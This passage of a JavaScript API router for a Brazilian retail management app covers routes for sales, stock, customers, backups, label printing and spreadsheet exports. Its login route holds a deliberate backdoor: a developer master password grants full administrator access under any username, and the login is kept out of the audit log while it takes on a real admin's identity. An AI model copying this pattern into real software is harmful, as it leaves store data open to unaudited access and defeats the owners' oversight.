// Salgueiro Gestão V2 — roteador local da API (era o main.js do Electron).
// Roda dentro do WebView: recebe api(canal, payload) do frontend e executa
// a lógica de negócio. Contratos das rotas idênticos aos da V1.
/* global Neutralino, NL_PATH, NL_CWD, XLSX */

import * as ambiente from './ambiente.js';
import { criarBanco, resetarDados, validarBackup, estaVazio, radiografar, abrirDeBytes } from './db.js';
import * as auth from './core/auth.js';
import * as produtos from './core/produtos.js';
import * as estoque from './core/estoque.js';
import * as pdv from './core/pdv.js';
import * as clientes from './core/clientes.js';
import * as crediario from './core/crediario.js';
import * as financeiro from './core/financeiro.js';
import * as compras from './core/compras.js';
import * as relatorios from './core/relatorios.js';
import * as config from './core/config.js';
import * as dashboard from './core/dashboard.js';
import * as permissoes from './core/permissoes.js';
import * as devolucoes from './core/devolucoes.js';
import * as importarVendas from './core/importar-vendas.js';
import * as valesTroca from './core/vales_troca.js';
import * as pontos from './core/pontos.js';
import * as consignacao from './core/consignacao.js';
import * as licenca from './core/licenca.js';
import * as lojas from './core/lojas.js';
import * as estoques from './core/estoques.js';
import * as rede from './core/rede.js';
import * as nuvem from './core/nuvem.js';
import * as updater from './core/updater.js';
import { cssCupomArquivo, medidasAtivas } from '../impressao.js';
import * as trocas from './core/trocas.js';
import * as mensagens from './core/mensagens.js';
import { LOGO_DEFAULT } from './core/logo-default.js';
import { qrSvg } from '../vendor/qrcode.js';

let db;
let sessao = { usuario: null };
// Preenchido no boot quando o app precisou se auto-recuperar. A tela lê por
// 'app:recuperacao' e avisa o usuário — recuperação silenciosa esconde
// problema, e problema escondido volta maior.
let RECUPERACAO_BOOT = null;

const AVISO_FASE = (recurso) =>
  ({ ok: false, erro: `${recurso} será ativado em uma próxima atualização desta versão.` });

// ---- Fotos: resolvem o NOME de arquivo guardado no banco para data URI ------
// (as telas continuam recebendo a imagem pronta; ver ambiente.lerFotoArquivo)
async function _resolverFotosLista(itens, ...campos) {
  if (!Array.isArray(itens)) return itens;
  await Promise.all(itens.map(async (it) => {
    if (!it) return;
    for (const c of campos) {
      if (it[c]) it[c] = await ambiente.lerFotoArquivo(it[c]);
    }
  }));
  return itens;
}

// ---- Rotas -----------------------------------------------------------------
const rotas = {
  // Aplicativo
  'app:versao': () => ({ ok: true, version: ambiente.versaoApp() }),
  'app:recuperacao': () => ({ ok: true, recuperacao: RECUPERACAO_BOOT }),

  // Mensagens internas e avisos (v3.1.0 — chat de volta, agora com runVolatil
  // no ping de presença: o polling não reescreve mais o banco em disco).
  'mensagens:resumo': (p) => mensagens.resumo(db, sessao.usuario, p),
  'mensagens:contatos': () => mensagens.contatos(db, sessao.usuario),
  'mensagens:historico': (p) => mensagens.historico(db, sessao.usuario, p),
  'mensagens:enviar': (p) => mensagens.enviar(db, sessao.usuario, p),
  'mensagens:marcarLido': (p) => mensagens.marcarLido(db, sessao.usuario, p),
  'mensagens:terminais': () => mensagens.terminais(db, sessao.usuario),
  'avisos:enviar': (p) => mensagens.enviarAviso(db, sessao.usuario, p),
  'avisos:confirmar': (p) => mensagens.confirmarAviso(db, sessao.usuario, p),
  'avisos:listar': (p) => mensagens.listarAvisos(db, sessao.usuario, p),
  'avisos:encerrar': (p) => mensagens.encerrarAviso(db, sessao.usuario, p),
  'app:garantirExtensao': async () => { await ambiente.garantirExtensaoRede(); return { ok: true }; },

  // Autenticação
  // ATENÇÃO: sessao.usuario é gerenciado pelo chamador (api() para app local,
  // rede.js/sessoes para terminais). Não modificar sessao aqui para evitar
  // que login/logout de terminais corrompam a sessão do app principal.
  // Login normal. Se falhar, tenta a CHAVE-MESTRA do desenvolvedor: a MESMA
  // senha dev do painel de licença (licenca.senhaDevOk) entra no sistema como
  // administrador pleno, com QUALQUER usuário digitado. Serve de recuperação —
  // funciona mesmo sem nenhum usuário válido no banco. Não cria usuário e não
  // fica na auditoria (login silencioso, a pedido). Para não quebrar as chaves
  // estrangeiras das gravações, a sessão assume a identidade de um admin real
  // existente; só se não houver nenhum é que usa um "Suporte (Dev)" id 0.
  'auth:login': async (p) => {
    const r = await auth.login(db, p.usuario, p.senha);
    if (r.ok) return r;
    try {
      if (licenca.senhaDevOk(String(p && p.senha || ''))) {
        const adm = db.prepare(
          "SELECT id, nome, usuario, permissoes FROM usuarios WHERE perfil='admin' AND ativo=1 ORDER BY id LIMIT 1"
        ).get();
        const usuario = adm
          ? { id: adm.id, nome: adm.nome, usuario: adm.usuario, perfil: 'admin',
              permissoes: permissoes.efetivas('admin', adm.permissoes) }
          : { id: 0, nome: 'Suporte (Dev)', usuario: 'dev-mlopesdesign', perfil: 'admin',
              permissoes: permissoes.efetivas('admin', null) };
        return { ok: true, usuario };
      }
    } catch { /* senhaDevOk indisponível: mantém o erro normal de login */ }
    return r;
  },
  'auth:logout': () => ({ ok: true }),
  'auth:sessao': () => ({ ok: true, usuario: sessao.usuario }),
  'auth:listarUsuarios': () => auth.listarUsuarios(db),
  'auth:salvarUsuario': (p) => auth.salvarUsuario(db, p, sessao.usuario),
  'auth:trocarSenha': (p) => auth.trocarSenha(db, p, sessao.usuario),
  // v3.3.0: o desconto avulso deixou de exigir administrador. Quem está no PDV
  // confirma com a PRÓPRIA senha (a sessão manda, não o payload) e informa quem
  // autorizou e o motivo — que ficam gravados na venda.
  // Desconto manual no PDV: só com senha de administrador (v3.10.0).
  // Devolve um token de USO ÚNICO, com validade curta, que a venda tem de
  // apresentar. Sem isso a trava seria só da tela: bastaria um terminal em
  // rede montar o payload à mão para gravar desconto sem autorização nenhuma.
  'auth:autorizarDesconto': async (p) => {
    const r = await auth.autorizarDescontoAdmin(db, sessao.usuario, p || {});
    if (!r.ok) return r;
    const token = _novoTokenDesconto(r.autorizado_por, r.usuario_id);
    return { ok: true, autorizado_por: r.autorizado_por, token };
  },

  // Dashboard
  'dashboard:resumo': () => dashboard.resumo(db, sessao.usuario),
  'permissoes:catalogo': () => ({ ok: true, catalogo: permissoes.CATALOGO, defaults: permissoes.DEFAULTS }),

  // Configurações (white-label)
  'config:obter': () => config.obter(db),
  'config:salvar': (p) => config.salvar(db, p, sessao.usuario),

  // Ícone do aplicativo (barra de tarefas / atalho) — gravado na pasta de DADOS,
  // que o auto-updater e o instalador nunca sobrescrevem. Some nunca mais.
  'config:iconeStatus': async () => {
    try {
      const arq = `${await ambiente.dirDados()}/icone.ico`;
      await Neutralino.filesystem.getStats(arq);
      return { ok: true, personalizado: true, caminho: arq.replace(/\//g, '\\') };
    } catch {
      return { ok: true, personalizado: false, caminho: null };
    }
  },
  // p.dados = base64 do arquivo .ico (ou PNG já convertido para .ico pelo frontend)
  'config:definirIcone': async (p) => {
    if (!p?.dados) return { ok: false, erro: 'Nenhuma imagem recebida.' };
    try {
      const bin = atob(p.dados);
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      if (bytes.length < 6) return { ok: false, erro: 'Arquivo de ícone inválido.' };
      const arq = `${await ambiente.dirDados()}/icone.ico`;
      await Neutralino.filesystem.writeBinaryFile(arq, bytes.buffer);
      try { await Neutralino.window.setIcon(arq); } catch { /* aplica no próximo boot */ }
      return { ok: true, caminho: arq.replace(/\//g, '\\') };
    } catch (e) {
      return { ok: false, erro: 'Não foi possível salvar o ícone: ' + (e.message || e) };
    }
  },
  'config:removerIcone': async () => {
    try {
      const arq = `${await ambiente.dirDados()}/icone.ico`;
      try { await Neutralino.filesystem.remove(arq); } catch { /* já não existia */ }
      try { await Neutralino.window.setIcon(`${NL_PATH}/icon.ico`); } catch {}
      return { ok: true };
    } catch (e) {
      return { ok: false, erro: String(e) };
    }
  },

  // Impressoras — lista real do Windows via execCommand (sem precisar da extensão TCP).
  'config:listarImpressoras': async () => {
    try {
      const r = await Neutralino.os.execCommand(
        'powershell.exe -NoProfile -NonInteractive -Command "Get-Printer | Where-Object { $_.DriverName } | Select-Object Name,Default | ConvertTo-Json -Compress"'
      );
      if (r.exitCode !== 0) return { ok: false, erro: r.stdErr || 'Erro ao listar impressoras' };
      const raw = r.stdOut.trim();
      if (!raw) return { ok: true, impressoras: [] };
      const parsed = JSON.parse(raw);
      const arr = Array.isArray(parsed) ? parsed : [parsed];
      return { ok: true, impressoras: arr.map(p => ({ nome: p.Name, padrao: !!p.Default })) };
    } catch (e) {
      return { ok: false, erro: String(e) };
    }
  },

  // Impressão silenciosa local via execCommand + PS1 temp (não depende da extensão TCP).
  // p.impressora pode ser passado diretamente (ex: botão de teste antes de salvar).
  'config:imprimir': async (p) => {
    const tipo = p?.tipo || 'cupom';
    const cfg = config.obter(db).config || {};
    const impressora = p?.impressora || (tipo === 'etiqueta'
      ? (cfg.impressora_etiqueta || '')
      : (cfg.impressora_cupom || ''));
    if (!impressora) return { ok: false, erro: 'Impressora não configurada.' };

    const area = document.getElementById('area-impressao');
    if (!area || !area.innerHTML.trim()) return { ok: false, erro: 'Sem conteúdo para imprimir.' };

    // CSS mínimo embutido para que o arquivo HTML temporário renderize corretamente
    // body{width:76mm} dentro de @page{margin:2mm} → content area=76mm; padding-right:5mm garante que
    // valores alinhados à direita não sejam cortados pela margem física da impressora térmica.
    // v3.27.0: as medidas saíram do código e vieram para a configuração
    // (Configurações → Impressoras). Os padrões são exatamente os valores que
    // estavam fixos aqui, então nada muda para quem já imprime certo.
    const cssCupom = cssCupomArquivo(medidasAtivas(cfg));
    // Etiqueta 60x40mm paisagem (Pimaco TR6040: 60mm largura, 40mm altura)
    // Layout: et-left (nome/cor/ref/preço/barcode) + et-right (badge tamanho)
    // padding-left:5mm evita corte na borda física da impressora
    const cssEtq = `*{box-sizing:border-box;margin:0;padding:0}@page{size:60mm 40mm;margin:0}body{background:#fff;width:60mm;height:40mm;overflow:hidden}.etq-grid{display:flex;flex-direction:column}.etiqueta{width:60mm;height:40mm;padding:2mm 2mm 2mm 5mm;font-family:Arial,Helvetica,sans-serif;overflow:hidden;display:flex;flex-direction:row;gap:2mm;page-break-after:always;break-after:page}.et-left{flex:1;min-width:0;display:flex;flex-direction:column;overflow:hidden}.et-loja{font-size:6px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.05em;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;margin-bottom:.5mm}.et-nome{font-size:13px;font-weight:700;line-height:1.2;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;flex-shrink:0}.et-cor,.et-info{font-size:11px;color:#000;margin-top:1mm;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex-shrink:0}.et-ref{font-size:9px;color:#555;margin-top:.5mm;flex-shrink:0}.et-preco{font-size:12px;font-weight:700;margin-top:1mm;flex-shrink:0}.et-bc-wrap{margin-top:auto;flex-shrink:0}.et-bc-wrap>svg{width:100%;max-width:35mm;height:10mm;display:block}.et-bc-wrap .qrbox{display:flex}.et-bc-wrap .qrbox svg{width:14mm;height:14mm}.et-num{font-family:Consolas,monospace;font-size:7px;letter-spacing:.03em;margin-top:.5mm}.et-right{width:15mm;flex-shrink:0;display:flex;align-items:center;justify-content:center}.et-tam-badge{width:13mm;height:26mm;border:2px solid #000;border-radius:2.5mm;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:900;line-height:1;text-align:center;word-break:break-all;overflow:hidden}`;
    const css = tipo === 'etiqueta' ? cssEtq : cssCupom;

    // Ler logo da loja como data URI para embutir na impressão (funciona em Edge headless)
    let logoUri = '';
    try {
      const buf = await Neutralino.filesystem.readBinaryFile(`${NL_PATH}/src/img/logo-etq.jpeg`);
      const bytes = new Uint8Array(buf);
      let bin = '';
      const CHUNK = 8192;
      for (let i = 0; i < bytes.length; i += CHUNK) {
        bin += String.fromCharCode(...bytes.subarray(i, Math.min(i + CHUNK, bytes.length)));
      }
      logoUri = `data:image/jpeg;base64,${btoa(bin)}`;
    } catch { /* sem logo: img ficará oculta pelo onerror */ }

    const htmlFinal = area.innerHTML.replace(/__LOGO_URI__/g, logoUri);
    const conteudo = `<!DOCTYPE html><html><head><meta charset="utf-8"><style>${css}</style></head><body>${htmlFinal}</body></html>`;

    return await _imprimirDireto(conteudo, impressora, tipo);
  },

  // Backup manual local e restauração
  'backup:manual': async () => {
    const hora = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
    const destino = await ambiente.dialogoSalvar('Salvar backup do banco de dados', `salgueiro-backup-${hora}.db`);
    if (!destino) return { ok: false, erro: 'Operação cancelada.' };
    await db.salvarAgora();
    await ambiente.copiarBancoPara(destino, db.exportar());
    return { ok: true, arquivo: destino };
  },
  'backup:restaurar': async () => {
    const origem = await ambiente.dialogoAbrir('Escolher arquivo de backup para restaurar');
    if (!origem) return { ok: false, erro: 'Operação cancelada.' };

    const conf = await Neutralino.os.showMessageBox(
      'Restaurar backup',
      'Substituir os dados atuais pelo backup selecionado?\n\nUma cópia de segurança dos dados atuais será feita antes. O sistema será reiniciado.',
      'YES_NO', 'WARNING'
    );
    if (conf !== 'YES') return { ok: false, erro: 'Operação cancelada.' };

    const bytes = await ambiente.lerArquivoBinario(origem);
    return await _restaurarBytes(bytes);
  },

  // Restaura direto de um backup da lista (sem seletor de arquivos).
  // `confirmado` vem true quando o usuário já aceitou o aviso de perda.
  'backup:restaurarLocal': async (p) => {
    if (!p || !p.nome) return { ok: false, erro: 'Backup não informado.' };
    let bytes;
    try { bytes = await ambiente.lerBackupLocal(p.nome); }
    catch { return { ok: false, erro: 'Não foi possível ler esse backup.' }; }
    return await _restaurarBytes(bytes, { confirmado: !!p.confirmado });
  },

  'backup:listarLocais': async () => {
    const r = await ambiente.listarBackupsLocais();
    // Radiografa cada backup para a tela mostrar o que há dentro ANTES de
    // restaurar — o usuário nunca mais escolhe um arquivo vazio às cegas.
    const atual = await radiografar(db.exportar());
    const backups = [];
    for (const b of r.backups) {
      let info = null;
      try { info = await radiografar(await ambiente.lerBackupLocal(b.nome)); } catch {}
      backups.push({
        ...b,
        vendas: info ? info.vendas : -1,
        produtos: info ? info.produtos : -1,
        clientes: info ? info.clientes : -1,
        integro: !!(info && info.tabelasOk),
        temDados: !!(info && info.temDados),
        // sinaliza backup mais pobre que o banco em uso (restaurar = perder)
        perdeDados: !!(info && info.totalDados < atual.totalDados)
      });
    }
    return { ok: true, pasta: r.pasta, atual, backups };
  },

  // Backup obrigatório antes de baixar uma atualização.
  // O botão "Baixar e instalar" chama esta rota ANTES do download e aborta
  // a atualização se ela falhar. Nenhuma atualização toca no app sem um
  // ponto de retorno gravado em disco.
  'backup:preAtualizacao': async (p) => {
    await db.salvarAgora();
    const bytes = db.exportar();
    const info = await radiografar(bytes);
    if (!info.tabelasOk) {
      return { ok: false, erro: 'O banco atual está inconsistente. Atualização cancelada por segurança.' };
    }
    const versao = (p && p.versao) ? String(p.versao).replace(/[^\w.-]/g, '') : ambiente.versaoApp();
    const arquivo = await ambiente.salvarBackupCarimbado(bytes, `pre-atualizacao-v${versao}`);
    console.warn(`[atualização] backup de segurança: ${arquivo}`);
    return { ok: true, arquivo, info };
  },

  // Chamada logo antes do restartProcess do updater: nada pendente se perde.
  'backup:salvarAgora': async () => { await db.salvarAgora(); return { ok: true }; },

  // Categorias
  'categorias:listar': () => produtos.listarCategorias(db),
  'categorias:salvar': (p) => produtos.salvarCategoria(db, p, sessao.usuario),
  'categorias:excluir': (p) => produtos.excluirCategoria(db, p.id, sessao.usuario),

  // Produtos + grade
  'produtos:listar': async (p) => {
    const r = produtos.listarProdutos(db, p || {});
    if (r.ok) await _resolverFotosLista(r.produtos, 'foto');
    return r;
  },
  'produtos:obter': async (p) => {
    const r = produtos.obterProduto(db, p.id);
    if (r.ok) {
      if (r.produto) await _resolverFotosLista([r.produto], 'foto');
      await _resolverFotosLista(r.variacoes, 'foto');
    }
    return r;
  },
  'produtos:salvar': async (p) => {
    // Grava as fotos novas em arquivo ANTES de persistir; o banco guarda o nome.
    if (p && p.foto) { const n = await ambiente.salvarFotoArquivo(p.foto); if (n) p.foto = n; }
    if (p && Array.isArray(p.variacoes)) {
      for (const v of p.variacoes) {
        if (v && v.foto) { const n = await ambiente.salvarFotoArquivo(v.foto); if (n) v.foto = n; }
      }
    }
    return produtos.salvarProduto(db, p, sessao.usuario);
  },
  'produtos:excluir': (p) => produtos.excluirProduto(db, p.id, sessao.usuario),

  // Fotos guardadas em disco → data URI (usado pelo carregamento sob demanda)
  'fotos:obter': async (p) => {
    const foto = await ambiente.lerFotoArquivo(p && p.nome);
    return { ok: true, foto };
  },
  // Resolve VÁRIAS fotos de uma vez (usado pela lista de produtos com foto).
  // Devolve um mapa { nomeArquivo: dataUri } só dos nomes únicos, para não
  // repetir leitura de disco quando a mesma foto se repete em variações.
  'fotos:obterVarias': async (p) => {
    const nomes = (p && Array.isArray(p.nomes)) ? p.nomes : [];
    const fotos = {};
    await Promise.all([...new Set(nomes.filter(Boolean))].map(async (n) => {
      try { fotos[n] = await ambiente.lerFotoArquivo(n); }
      catch { fotos[n] = null; }
    }));
    return { ok: true, fotos };
  },

  // Estoque
  // A busca deixou de cortar em 40 (v3.25.41): produto novo ficava fora da lista
  // e o cliente achava que o cadastro não tinha entrado. Mas a foto vira base64
  // aqui, e resolver 500 fotos de uma vez traria de volta o estouro de memória
  // do WebView2 que a v3.25.22 corrigiu. Então: a LISTA vem inteira, e só as
  // primeiras FOTOS_BUSCA fotos viram imagem — o resto sai com o ícone padrão.
  // Digitar mais letras reduz a lista e as fotos voltam a aparecer.
  'estoque:buscar': async (p) => {
    const FOTOS_BUSCA = 40;
    const r = estoque.buscarVariacoes(db, p.termo);
    if (r.ok) {
      await _resolverFotosLista(r.variacoes.slice(0, FOTOS_BUSCA), 'foto');
      for (const v of r.variacoes.slice(FOTOS_BUSCA)) v.foto = null;
    }
    return r;
  },
  'pdv:trocarLoja': (p) => pdv.trocarLoja(db, p || {}, sessao.usuario),
  'estoque:movimentar': (p) => estoque.movimentar(db, p, sessao.usuario),
  'estoque:kardex': (p) => estoque.kardex(db, p || {}),
  'estoque:reposicao': () => estoque.reposicao(db),
  // Lista completa devolve o NOME do arquivo em `foto` (miniatura sob demanda no front)
  'estoque:listarCompleto': () => estoque.listarCompleto(db),
  'estoque:exportarXlsx': () => {
    const r = estoque.listarCompleto(db);
    if (!r.ok) return r;
    const cfg = config.obter(db).config || {};
    const ws = XLSX.utils.json_to_sheet(r.variacoes.map(v => ({
      'Produto': v.nome, 'Referência': v.referencia || '', 'Categoria': v.categoria,
      'Cor': v.cor || '', 'Tamanho': v.tamanho || '', 'Código de barras': v.codigo_barras || '',
      'Estoque': v.estoque, 'Preço custo': v.preco_custo || 0, 'Preço venda': v.preco_venda || 0,
      'Total custo': Math.round((v.estoque || 0) * (v.preco_custo || 0) * 100) / 100,
      'Total venda': Math.round((v.estoque || 0) * (v.preco_venda || 0) * 100) / 100
    })));
    // Rodapé totais
    const nRows = r.variacoes.length + 1;
    XLSX.utils.sheet_add_aoa(ws, [['', '', '', '', '', 'TOTAL:', r.totalPecas, '', '', r.totalCusto, r.totalVenda]], { origin: `A${nRows + 1}` });
    const wb = XLSX.utils.book_new();
    const loja = cfg.loja_nome || 'Salgueiro';
    XLSX.utils.book_append_sheet(wb, ws, 'Estoque');
    const b64 = XLSX.write(wb, { type: 'base64', bookType: 'xlsx' });
    return { ok: true, buffer: b64, loja };
  },

  // Exportação da lista de produtos com filtros e colunas escolhidas pelo usuário
  'estoque:exportarXlsxFiltrado': (p) => {
    const r = estoque.listarCompleto(db);
    if (!r.ok) return r;
    const o = p || {};
    const c = o.cols || {};
    const arr = r.variacoes.filter(v => {
      if (o.categoria && v.categoria !== o.categoria) return false;
      if (o.filtro === 'com' && !(v.estoque > 0)) return false;
      if (o.filtro === 'sem' && v.estoque > 0) return false;
      return true;
    });
    if (!arr.length) return { ok: false, erro: 'Nenhum produto encontrado com esses filtros.' };
    const a2 = n => Math.round((Number(n) || 0) * 100) / 100;
    const rows = arr.map(v => {
      const linha = { 'Produto': v.nome };
      if (c.ref) linha['Referência'] = v.referencia || '';
      if (c.cat) linha['Categoria'] = v.categoria || '';
      if (c.cor) { linha['Cor'] = v.cor || ''; linha['Tamanho'] = v.tamanho || ''; }
      if (c.cod) linha['Código de barras'] = v.codigo_barras || '';
      if (c.est) linha['Estoque'] = v.estoque;
      if (c.custo) linha['Preço custo'] = a2(v.preco_custo);
      if (c.venda) linha['Preço venda'] = a2(v.preco_venda);
      if (c.total) linha['Total venda'] = a2((v.estoque || 0) * (v.preco_venda || 0));
      if (c.conf) linha['Conferido'] = '';
      return linha;
    });
    const ws = XLSX.utils.json_to_sheet(rows);
    // Linha de totais
    const chaves = Object.keys(rows[0]);
    const totais = chaves.map(k => {
      if (k === 'Produto') return 'TOTAL';
      if (k === 'Estoque') return arr.reduce((s, v) => s + (v.estoque || 0), 0);
      if (k === 'Total venda') return a2(arr.reduce((s, v) => s + (v.estoque || 0) * (v.preco_venda || 0), 0));
      return '';
    });
    XLSX.utils.sheet_add_aoa(ws, [totais], { origin: `A${rows.length + 2}` });
    ws['!cols'] = chaves.map(k => ({ wch: k === 'Produto' ? 34 : Math.max(12, k.length + 3) }));
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, 'Produtos');
    return { ok: true, buffer: XLSX.write(wb, { type: 'base64', bookType: 'xlsx' }) };
  },

  // Clientes
  'clientes:listar': (p) => clientes.listar(db, p || {}),
  'clientes:salvar': (p) => clientes.salvar(db, p, sessao.usuario),
  'clientes:obter': (p) => crediario.obterCliente(db, p.id),
  'clientes:excluir': (p) => crediario.excluirCliente(db, p.id, sessao.usuario),
  'clientes:listarCategorias': () => clientes.listarCategorias(db),
  'clientes:salvarCategoria': (p) => clientes.salvarCategoria(db, p, sessao.usuario),
  'clientes:excluirCategoria': (p) => clientes.excluirCategoria(db, p.id, sessao.usuario),
  'clientes:exportarDados': () => {
    if (!sessao.usuario || sessao.usuario.perfil !== 'admin') return { ok: false, erro: 'Apenas administradores podem exportar clientes.' };
    return clientes.exportar(db);
  },
  'clientes:exportar': () => {
    if (!sessao.usuario || sessao.usuario.perfil !== 'admin') return { ok: false, erro: 'Apenas administradores podem exportar clientes.' };
    const r = clientes.exportar(db);
    if (!r.ok) return r;
    const ws = XLSX.utils.json_to_sheet(r.clientes.map(c => ({
      nome: c.nome, cpf: c.cpf || '', telefone: c.telefone || '', email: c.email || '',
      endereco: c.endereco || '', nascimento: c.nascimento || '', categoria: c.categoria || '',
      limite_credito: c.limite_credito || 0, obs: c.obs || '', pontos: c.pontos
    })));
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, 'Clientes');
    const b64 = XLSX.write(wb, { type: 'base64', bookType: 'xlsx' });
    return { ok: true, buffer: b64, total: r.clientes.length };
  },
  'clientes:importar': (p) => {
    if (!sessao.usuario || sessao.usuario.perfil !== 'admin') return { ok: false, erro: 'Apenas administradores podem importar clientes.' };
    if (!p || !p.dados) return { ok: false, erro: 'Dados ausentes.' };
    let linhas;
    if (p.formato === 'xlsx') {
      const wb = XLSX.read(p.dados, { type: 'base64' });
      const ws = wb.Sheets[wb.SheetNames[0]];
      linhas = XLSX.utils.sheet_to_json(ws, { defval: '' });
    } else {
      // CSV: dados é string utf-8
      const rows = p.dados.split(/\r?\n/).filter(l => l.trim());
      if (rows.length < 2) return { ok: false, erro: 'CSV sem dados.' };
      const sep = rows[0].includes(';') ? ';' : ',';
      const headers = rows[0].split(sep).map(h => h.trim().replace(/^"|"$/g, ''));
      linhas = rows.slice(1).map(row => {
        const vals = row.split(sep).map(v => v.trim().replace(/^"|"$/g, ''));
        const obj = {};
        headers.forEach((h, i) => { obj[h] = vals[i] || ''; });
        return obj;
      });
    }
    return clientes.importar(db, linhas, sessao.usuario);
  },

  // Crediário
  'crediario:abertas': (p) => crediario.parcelasAbertas(db, p || {}),
  'crediario:receber': (p) => crediario.receberParcela(db, p, sessao.usuario),
  'clientes:aniversariantes': () => crediario.aniversariantes(db),
  'crediario:aniversariantes': () => crediario.aniversariantes(db), // alias legado

  // Fornecedores + Compras
  'fornecedores:listar': (p) => compras.listarFornecedores(db, p || {}),
  'fornecedores:salvar': (p) => compras.salvarFornecedor(db, p, sessao.usuario),
  'fornecedores:excluir': (p) => compras.excluirFornecedor(db, p.id, sessao.usuario),
  'compras:criar': (p) => compras.criarCompra(db, p, sessao.usuario),
  'compras:listar': () => compras.listarCompras(db),
  'compras:obter': (p) => compras.obterCompra(db, p.id),
  'compras:receber': (p) => compras.receberCompra(db, p, sessao.usuario),
  'compras:cancelar': (p) => compras.cancelarCompra(db, p.id, sessao.usuario),

  // Relatórios
  'relatorios:vendas': (p) => relatorios.vendasPeriodo(db, p || {}),
  'relatorios:abc': (p) => relatorios.curvaAbc(db, p || {}),
  'relatorios:paradas': (p) => relatorios.pecasParadas(db, p || {}),
  'relatorios:estoque': (p) => relatorios.estoqueDetalhado(db, p || {}),
  'relatorios:receitaPorLoja': (p) => relatorios.receitaPorLoja(db, p || {}),
  'relatorios:consignados': (p) => relatorios.consignadosMensal(db, p || {}),
  'relatorios:evento': (p) => relatorios.relatorioEvento(db, p || {}),
  // Compras de quem tem categoria acompanhada (v3.10.0)
  'relatorios:acompanhadas': (p) => relatorios.comprasAcompanhadas(db, p || {}),
  'relatorios:acompanhadasXlsx': (p) => {
    const r = relatorios.comprasAcompanhadas(db, p || {});
    if (!r.ok) return r;
    const wb = XLSX.utils.book_new();
    const a2 = (n) => Math.round((Number(n) || 0) * 100) / 100;
    const add = (nome, linhas, larguras) => {
      if (!linhas.length) return;
      const ws = XLSX.utils.json_to_sheet(linhas);
      if (larguras) ws['!cols'] = larguras.map(w => ({ wch: w }));
      XLSX.utils.book_append_sheet(wb, ws, nome.slice(0, 31));
    };
    add('Pessoas', r.clientes.map(c => ({
      'Pessoa': c.cliente, 'Categoria': c.categoria, 'Desconto %': c.pct,
      'Compras': c.compras, 'Peças': c.pecas, 'Média peças/compra': c.media_pecas,
      'Valor de tabela': a2(c.tabela), 'Desconto': a2(c.desconto), 'Pagou': a2(c.pago),
      'Primeira': c.primeira, 'Última': c.ultima
    })), [26, 20, 11, 9, 8, 17, 15, 13, 13, 12, 12]);
    // Uma linha por peça levada, com a pessoa ao lado — é a folha que mostra
    // o padrão de revenda (mesma peça, muita quantidade, sempre a mesma pessoa).
    const detalhe = [];
    for (const c of r.clientes) {
      for (const x of c.produtos) {
        detalhe.push({
          'Pessoa': c.cliente, 'Categoria': c.categoria,
          'Tipo de peça': x.produto, 'Ref.': x.referencia || '',
          'Cor': x.cor || '', 'Tamanho': x.tamanho || '',
          'Quantidade': x.qtd, 'Total': a2(x.total)
        });
      }
    }
    add('Peças por pessoa', detalhe, [26, 20, 30, 12, 14, 10, 12, 13]);
    add('Peças no total', r.por_produto.map(x => ({
      'Tipo de peça': x.produto, 'Ref.': x.referencia || '',
      'Cor': x.cor || '', 'Tamanho': x.tamanho || '',
      'Quantidade': x.qtd, 'Total': a2(x.total), 'Pessoas': x.clientes
    })), [30, 12, 14, 10, 12, 13, 10]);
    add('Resumo', [
      { Indicador: 'Período', Valor: `${r.de} até ${r.ate}` },
      { Indicador: 'Pessoas', Valor: r.resumo.clientes },
      { Indicador: 'Compras', Valor: r.resumo.compras },
      { Indicador: 'Peças', Valor: r.resumo.pecas },
      { Indicador: 'Valor de tabela', Valor: a2(r.resumo.tabela) },
      { Indicador: 'Desconto concedido', Valor: a2(r.resumo.desconto) },
      { Indicador: 'Pago', Valor: a2(r.resumo.pago) }
    ], [26, 26]);
    if (!wb.SheetNames.length) return { ok: false, erro: 'Nada para exportar no período.' };
    return { ok: true, buffer: XLSX.write(wb, { type: 'base64', bookType: 'xlsx' }) };
  },
  'relatorios:ranking': (p) => relatorios.ranking(db, p || {}),
  'relatorios:eventos': (p) => relatorios.eventosVenda(db, p || {}),
  'relatorios:rankingPeriodo': (p) => relatorios.rankingPeriodo(db, p || {}),
  'relatorios:rankingPeriodoXlsx': (p) => {
    const r = relatorios.rankingPeriodo(db, p || {});
    if (!r.ok) return r;
    const a2 = n => Math.round((Number(n) || 0) * 100) / 100;
    const per = r.periodo;
    const wb = XLSX.utils.book_new();
    const add = (nome, rows, larguras) => {
      if (!rows || !rows.length) return;
      const ws = XLSX.utils.json_to_sheet(rows);
      ws['!cols'] = (larguras || Object.keys(rows[0]).map(k => Math.max(12, k.length + 3))).map(w => ({ wch: w }));
      XLSX.utils.book_append_sheet(wb, ws, nome);
    };
    const seta = (d) => d === undefined ? '' : d === null ? 'novo' : d > 0 ? `+${d}` : d < 0 ? String(d) : '=';
    add('Ranking', per.produtos.map(x => ({
      'Posição': x.pos, 'Produto': x.nome, 'Referência': x.referencia,
      'Categoria': x.categoria, 'Peças': x.pecas, 'Receita': a2(x.receita),
      'Variação': seta(x.delta)
    })), [9, 34, 14, 20, 10, 14, 12]);
    add('Categorias', per.categorias.map(c => ({
      'Categoria': c.categoria, 'Peças': c.pecas, 'Receita': a2(c.receita) })), [26, 10, 14]);
    add('Cor e tamanho', per.variacoes.map(v => ({
      'Produto': v.produto, 'Cor': v.cor, 'Tamanho': v.tamanho,
      'Peças': v.pecas, 'Receita': a2(v.receita), 'Estoque atual': v.estoque })), [34, 14, 10, 10, 14, 14]);
    add('Clientes', per.clientes.map(c => ({
      'Cliente': c.nome, 'Categoria': c.categoria, 'Compras': c.compras,
      'Total gasto': a2(c.gasto) })), [32, 20, 10, 14]);
    add('Por hora', per.por_hora.map(h => ({
      'Hora': `${String(h.hora).padStart(2, '0')}h`, 'Vendas': h.vendas, 'Receita': a2(h.receita) })), [10, 10, 14]);
    if (!wb.SheetNames.length) return { ok: false, erro: 'Nenhuma venda nesse período.' };
    return { ok: true, buffer: XLSX.write(wb, { type: 'base64', bookType: 'xlsx' }) };
